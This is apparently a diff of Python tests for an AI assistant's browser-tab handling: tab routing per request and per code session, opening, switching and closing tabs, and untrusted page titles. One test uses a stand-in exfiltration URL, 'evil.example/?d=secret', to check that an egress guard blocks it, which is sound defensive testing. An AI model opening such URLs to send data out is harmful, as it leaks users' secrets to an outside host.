@@ -494,3 +494,220 @@ async def test_browser_read_asks_for_the_fuller_read_from_its_offset():
         "rich": True, "offset": 0, "limit": browser_agent.READ_LIMIT, "tab": 3,
     }  # fmt: skip
     assert hub.browser_call is window
+
+
+# ── tabs ──
+
+
+class TabWindow:
+    """The window's open and tabs, as app/browser-agent.js answers them."""
+
+    def __init__(self):
+        self.tabs = {2: {"owner": "", "url": "https://news.example/", "title": "News"}}
+        self.shown = 2
+        self.next = 3
+        self.calls = []
+
+    async def __call__(self, action, args=None):
+        args = dict(args or {})
+        self.calls.append((action, args))
+        if action == "open":
+            if args.get("newTab"):
+                tab = self.next
+                self.next += 1
+                self.tabs[tab] = {"owner": args.get("owner", ""), "url": args["url"], "title": ""}
+            else:
+                tab = args.get("tab", self.shown)
+                if tab not in self.tabs:
+                    return {
+                        "ok": False,
+                        "message": f"Tab {tab} is closed. List the open tabs with browser_tabs.",
+                    }
+                self.tabs[tab]["url"] = args["url"]
+            if not args.get("background"):
+                self.shown = tab
+            return {
+                "ok": True,
+                "tab": tab,
+                "url": args["url"],
+                "title": "",
+                "shown": tab == self.shown,
+            }
+        if action == "tabs" and args["op"] == "list":
+            return {
+                "ok": True,
+                "tabs": [{"id": k, **v, "shown": k == self.shown} for k, v in self.tabs.items()],
+            }
+        if action == "tabs" and args["op"] == "close":
+            self.tabs.pop(args["id"], None)
+            return {"ok": True, "message": f"Closed tab {args['id']}."}
+        if action == "tabs" and args["op"] == "switch":
+            if not args.get("background"):
+                self.shown = args["id"]
+            return {"ok": True, "message": f"Showing tab {args['id']}.", "tab": args["id"]}
+        return {"ok": True, "tab": args.get("tab", self.shown), "url": "https://x.example/"}
+
+    def last(self, action):
+        return [a for n, a in self.calls if n == action][-1]
+
+
+def test_jarvis_works_in_its_tab_for_the_rest_of_a_request():
+    routes = browser_agent.TabRoutes()
+    assert routes.route({"text": "Buy"}, "r1") == {"text": "Buy"}  # no tab of its own yet
+    routes.set_jarvis("r1", 7)
+    assert routes.route({"text": "Buy"}, "r1") == {"text": "Buy", "tab": 7}
+    assert routes.route({"tab": 3}, "r1") == {"tab": 3}  # a tab it names
+    assert routes.route({"owner": "code:2"}, "r1") == {"owner": "code:2"}  # a session's call
+    assert routes.route({"text": "Buy"}, "r2") == {
+        "text": "Buy"
+    }  # the next request: the tab on show
+    routes.set_session(2, 9)
+    routes.forget(9)
+    routes.forget(7)
+    assert routes.session_tab(2) is None and routes.jarvis_tab("r1") is None
+
+
+async def test_jarvis_opens_its_own_tab_and_keeps_to_it():
+    window = TabWindow()
+    hub = SimpleNamespace(browser_call=window, browser_tabs=browser_agent.TabRoutes(), _rid="r1")
+    first = await browser_agent.jarvis_open(hub, {"url": "https://a.example/"})
+    assert window.last("open") == {"url": "https://a.example/", "owner": "jarvis", "newTab": True}
+    assert (
+        first["tab"] == 3 and window.tabs[2]["url"] == "https://news.example/"
+    )  # the user's page stays
+    await browser_agent.jarvis_open(hub, {"url": "https://b.example/"})
+    assert window.last("open") == {"url": "https://b.example/", "owner": "jarvis", "tab": 3}
+    await browser_agent.jarvis_open(
+        hub, {"url": "https://c.example/", "new_tab": True, "background": True}
+    )
+    assert window.last("open")["newTab"] and window.last("open")["background"]
+    assert window.shown == 3  # a background tab doesn't take over the view
+    hub._rid = "r2"  # a new request starts again from a new tab
+    await browser_agent.jarvis_open(hub, {"url": "https://d.example/"})
+    assert window.last("open")["newTab"]
+    await browser_agent.jarvis_open(hub, {"url": "https://e.example/", "same_tab": True})
+    assert "tab" not in window.last("open") and "newTab" not in window.last("open")
+
+
+async def test_a_closed_tab_is_replaced_not_reused():
+    window = TabWindow()
+    hub = SimpleNamespace(browser_call=window, browser_tabs=browser_agent.TabRoutes(), _rid="r1")
+    hub.browser_tabs.set_jarvis("r1", 40)  # a tab the user has since closed
+    r = await browser_agent.jarvis_open(hub, {"url": "https://a.example/"})
+    assert r["ok"] and window.last("open")["newTab"]
+    assert hub.browser_tabs.jarvis_tab("r1") == r["tab"]
+
+
+async def test_a_session_has_its_own_tab():
+    window = TabWindow()
+    routes = browser_agent.TabRoutes()
+    session = CodeSession(Tasks(), 7, routes)
+    tools = handlers(code_tools.browser_tools(window, session))
+    await tools["browser_open"]({"url": "http://localhost:5173/"})
+    assert window.last("open") == {
+        "url": "http://localhost:5173/",
+        "newTab": True,
+        "owner": "code:7",
+    }
+    tab = session.tab
+    await tools["browser_read"]({})
+    assert window.last("read")["tab"] == tab and window.last("read")["owner"] == "code:7"
+    await tools["browser_open"]({"url": "http://localhost:5173/about"})
+    assert window.last("open") == {
+        "url": "http://localhost:5173/about",
+        "owner": "code:7",
+        "tab": tab,
+    }
+    other = CodeSession(Tasks(), 8, routes)  # another session: another tab
+    await handlers(code_tools.browser_tools(window, other))["browser_open"](
+        {"url": "http://localhost:3000/"}
+    )
+    assert other.tab not in (None, tab)
+    window.tabs.pop(tab)  # the user closed the first session's tab
+    await tools["browser_open"]({"url": "http://localhost:5173/"})
+    assert session.tab not in (None, tab)
+
+
+async def test_browser_tabs_lists_switches_opens_and_closes():
+    window = TabWindow()
+    routes = browser_agent.TabRoutes()
+    session = CodeSession(Tasks(), 7, routes)
+    tabs = handlers(code_tools.browser_tools(window, session))["browser_tabs"]
+    opened = await tabs({"op": "open", "url": "http://localhost:5173/", "background": True})
+    assert not opened.get("is_error") and session.tab == 3 and window.shown == 2
+    listing = text_of(await tabs({"op": "list"}))
+    assert "- Tab 2: News — https://news.example/ (on show)" in listing
+    assert "- Tab 3: (no title) — http://localhost:5173/ (yours)" in listing
+    assert browser_agent.UNTRUSTED in listing  # titles are the pages' words
+    switched = await tabs({"op": "switch", "id": 2})
+    assert not switched.get("is_error") and session.tab == 2
+    mine_only = await tabs({"op": "close", "id": 2})
+    assert mine_only.get("is_error") and "only the tabs it opened" in text_of(mine_only)
+    assert not (await tabs({"op": "close", "id": 3})).get("is_error") and 3 not in window.tabs
+    assert (await tabs({"op": "switch"})).get("is_error")
+
+
+async def test_jarvis_opening_a_tab_meets_the_same_check_as_browser_open():
+    window = TabWindow()
+    checked = []
+
+    async def egress_ok(tool_name, tool_input):
+        checked.append((tool_name, tool_input))
+        return False
+
+    hub = SimpleNamespace(
+        browser_call=window, browser_tabs=browser_agent.TabRoutes(), _rid="r1", _egress_ok=egress_ok,
+        prefs=SimpleNamespace(control_always=True), confirm=None,
+    )  # fmt: skip
+    tabs = handlers(browser_agent.jarvis_tools(hub))["browser_tabs"]
+    out = await tabs({"op": "open", "url": "https://evil.example/?d=secret"})
+    assert out.get("is_error") and "didn't OK" in text_of(out)
+    assert checked == [("mcp__browser__browser_open", {"url": "https://evil.example/?d=secret"})]
+    assert not any(n == "open" for n, _ in window.calls)
+    await tabs({"op": "switch", "id": 2, "background": True})
+    assert hub.browser_tabs.jarvis_tab("r1") == 2
+
+
+def test_browser_tabs_is_classified_as_acting():
+    assert "browser_tabs" in brain.BROWSER_CONTROL
+    assert brain.result_kind(brain.browser_tool("browser_tabs")) == "web"
+    assert tool_label("mcp__browser__browser_tabs") == "Worked with browser tabs"
+
+
+async def test_listing_tabs_keeps_a_purchase_confirmation(tmp_path):
+    window = FakeWindow()
+    d, _ = desk(tmp_path, window)
+    await d.confirm(ORDER)
+    browser = tx.guard_browser(d, window)
+    await browser("tabs", {"op": "list"})
+    assert (await browser("act", {"kind": "click", "ref": "e1"}))["ok"] is True
+
+
+async def test_the_hub_sends_jarvis_calls_to_its_tab_and_forgets_a_closed_one(
+    settings, quiet_speaker, isolated
+):
+    from conftest import FakeClient
+
+    from jarvis.hub import Hub
+
+    hub = Hub(settings, client_factory=FakeClient, speaker=quiet_speaker, poll=False, **isolated)
+    seen = []
+
+    async def window(action, args=None):
+        seen.append((action, dict(args or {})))
+        if seen[-1][1].get("tab") == 7 and len(seen) > 1:
+            return {
+                "ok": False,
+                "message": "Tab 7 is closed. List the open tabs with browser_tabs.",
+            }
+        return {"ok": True, "url": "https://a.example/", "tab": 7}
+
+    hub._guarded_browser = tx.guard_browser(hub.transactions, window)
+    hub._rid = "r1"
+    hub.browser_tabs.set_jarvis("r1", 7)
+    await hub.browser_call("scroll", {"amount": 1})
+    assert seen[-1] == ("scroll", {"amount": 1, "tab": 7})
+    await hub.browser_call("scroll", {"amount": 1})  # the user closed it meanwhile
+    assert hub.browser_tabs.jarvis_tab("r1") is None
+    await hub.browser_call("scroll", {"amount": 1})
+    assert seen[-1] == ("scroll", {"amount": 1})  # back to the tab on show
